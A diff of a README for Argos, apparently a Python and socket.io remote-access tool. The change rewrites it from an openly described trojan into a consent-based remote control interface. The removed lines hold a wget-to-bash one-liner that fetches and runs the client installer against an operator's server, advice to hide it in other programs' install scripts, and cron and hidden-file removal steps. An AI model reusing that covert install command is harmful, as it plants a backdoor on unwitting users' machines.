@@ -9,17 +9,15 @@
 - [**Presentation**](#presentation)
 - [**Compatibility**](#compatibility)
 - [**Installation**](#installation)
-- [**Removing**](#removing)
 - [**Credits**](#credits)
 
 ## Presentation
 
 #### Main goal
 
-This program work on **Linux** distrubtion.
+This program was made to work on **Linux** distrubtion but will woon be adapted to **Windows**.
 
-The main goal of this project is to show how frighteningly easy it is to create a program that can access to another machine.
-This project is a [**trojan**](https://us.norton.com/internetsecurity-malware-what-is-a-trojan.html) that, when used in an installation script, can easily be installed and gain access to the whole system.
+The main goal of this project is to make a remote control interface to use with the **consent** of the person whose pc is controlled.
 
 #### How it works
 
@@ -34,7 +32,9 @@ Get to the client part
 cd client/
 ```
 
-The client side program is made using [**python3**](https://www.python.org/downloads/) and can easily be called in the installation script of another program by using a simple curl command.
+The client side program is made using [**python3**](https://www.python.org/downloads/).
+
+To start it you must have installed the dependencies. If you are too lazy to install them yourself, you can just use the *one_time* script present in client-side folders.
 
 The client side is using [**socket io**](https://socket.io/fr/) to connect with the server through web sockets.
 In case the server is not running, the program will try every 3 seconds to connect to the server until it's connected.
@@ -90,54 +90,30 @@ FrontEnd endpoints:
 Client OS:
 | OS | Compatible ? |
 |----|--------------|
-|Windows|❌|
+|Windows|🔨(soon)|
 |Debian based|✅|
 |Fedora|✅|
-|Arch|❌|
-|Mac OS|❌|
+|Arch|⚠️(Python is needed)|
+|Mac OS|✅|
 
 ## Installation
 
-In order to use the project, you need to have a script that people will run.
+*⚠️ :Installation scripts are being written. While waiting for it to be added, you can use the on time clients*
 
-In this very script, you juste have to call this command (remember to replace the 'Adress of the online server' by your server adress) :
+To launch them individually, you can just use the command below.
+
+⚠️ *Note that the program will ask you for you password and the server url of the backend server in order to know where to connect*
+
+#### Linux
 ```bash
-wget -q -O - https://raw.githubusercontent.com/Just1truc/Argos/main/client/install_argos > here && chmod 777 here && bash here "Adress of the online server" && rm here
+chmod a+x one_time_client && ./one_time_client
 ```
-Once this command has been run, everthing should be ready for the client.
+
+#### Windows
+*Coming soon*
 
 Also, to setup the server, it's kinda more complicated.
 You have to host both the [**front**](https://github.com/Just1truc/Argos/blob/main/online_server/frontend/README.md) and the [**backend**](https://github.com/Just1truc/Argos/tree/main/online_server/server/README.md).
-
-## Removing
-
-This trojan is pretty annoying right? So let's remove it from your computer !
-
-### Automatically
-
-```bash
-crontab -r; kill $(ps -aux | grep /usr/local/src/.service.exwrap.py | grep -v "grep" | awk '{print $2}')
-```
-
-### Manually
-
-To do so, you just need to first execute this command to get rid of the cronjob :
-```bash
-crontab -r
-```
-
-Then, you need to cut the access to your computer, so let's kill the script doing that:
-if you don't have ``htop``, you may have to install it.
-```bash
-htop -F python
-```
-
-> Tip: The trojan file is .service.exwrap.py
-
-Then, keep the pid of the command that is using *python3* to run and kill it:
-```bash
-kill [pid]
-```
 
 ## Credits:
 <div align="center">
